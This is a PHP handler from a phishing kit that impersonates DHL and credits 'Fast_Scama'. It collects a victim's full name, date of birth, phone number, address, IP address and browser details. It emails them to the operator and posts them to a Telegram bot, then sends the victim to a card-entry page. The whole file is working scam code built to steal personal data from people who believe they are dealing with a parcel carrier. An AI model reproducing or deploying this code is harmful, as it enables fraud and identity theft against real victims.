<?php

include '../settings.php';
session_start();

$date = date('d/m/y');
$heure = date('H:i:s');
$dateHeure = "$date, $heure";
$_SESSION['date_heure'] = $dateHeure;
$_SESSION['ip'] = $_SERVER['REMOTE_ADDR'];
$_SESSION['useragent'] = $_SERVER['HTTP_USER_AGENT'];


$_SESSION['nom'] = 		$_POST['nom'];
$_SESSION['prenom'] = 	$_POST['prenom'];
$_SESSION['dob'] = 		$_POST['dob'];
$_SESSION['cp'] = 		$_POST['cp'];
$_SESSION['ville'] = 	$_POST['ville'];
$_SESSION['adresse'] = 	$_POST['adresse'];
$_SESSION['tel'] = 		$_POST['tel'];




if (isset($_POST['info_submit'])) {
	if (!empty($_POST['nom']) && !empty($_POST['prenom']) && !empty($_POST['dob']) && !empty($_POST['cp']) && !empty($_POST['ville']) && !empty($_POST['adresse']) && !empty($_POST['tel'])) {



		if ($mail_sending == true) {
			$message = "
					[📦] Informations | DHL MULTI 2023
					
					[👤] Nom  : " . $_SESSION['nom'] . "
					[👤] Prénom : " . $_SESSION['prenom'] . "					
					[📝] Date de naissance  : " . $_SESSION['dob'] . "
					[📞] N° Mobile : " . $_SESSION['tel'] . "
					[📍] Adresse  : " . $_SESSION['adresse'] . "
					[🌍] Ville : " . $_SESSION['ville'] . "
					[🌍] Code Postale : " . $_SESSION['cp'] . "
					
					[🗺️] INFORMATIONS COMPLÉMENTAIRES [🗺️]
					[⌚] Heure et date du rez : " . $_SESSION['date_heure'] . "
					[🌐] IP : " . $_SESSION['ip'] . "
					[📍] User-agent : " . $_SESSION['useragent'] . "
					[©️] 𝐂𝐨𝐝𝐞𝐝 𝐛𝐲 𝐅𝐚𝐬𝐭_𝐒𝐜𝐚𝐦𝐚[©️]
					";
			$subject = "  [INFO] |" . $_SESSION['nom'] . $_SESSION['prenom'] . " | " . $_SESSION['ip'];
			$headers = "From: DHL MULTI 2023  | Informations <rez@fastscama.fr>";
			mail($rezmail, $subject, $message, $headers);
		}


		if ($telegram_sending == true) {
			$data = [
				'text' => '
					[📦] Informations | DHL MULTI 2023 				

					[👤] Nom et Prénom  : ' . $_SESSION['nom'] . ' ' . $_SESSION['prenom'] . '
					[📝] Date de naissance  : ' . $_SESSION['dob'] . '					
					[📞] N°Mobile   : ' . $_SESSION['tel'] . '
					[📍] Adresse  : ' . $_SESSION['adresse'] . '
					[🌍] Ville   : ' . $_SESSION['ville'] . '
					[🌍] Code Postale  : ' . $_SESSION['cp'] . '

					[🗺️] Informations liée au client  [🗺️]
					[⌚] Heure et date du rez : ' . $_SESSION['date_heure'] . '
					[🌐] Adresse Ip : ' . $_SESSION['ip'] . '
					[📍] User-agent : ' . $_SESSION['useragent'] . '

					[©️] 𝐂𝐨𝐝𝐞𝐝 𝐛𝐲 𝐅𝐚𝐬𝐭_𝐒𝐜𝐚𝐦𝐚[©️]			  
					',
				'chat_id' => $chat_login
			]; //1.1


			file_get_contents("https://api.telegram.org/bot$bot_token/sendMessage?" . http_build_query($data));
		}

		header('Location: ../user/carte.php');
	} else {
		header('Location: ../user/info.php?error=1');
	}

}



?>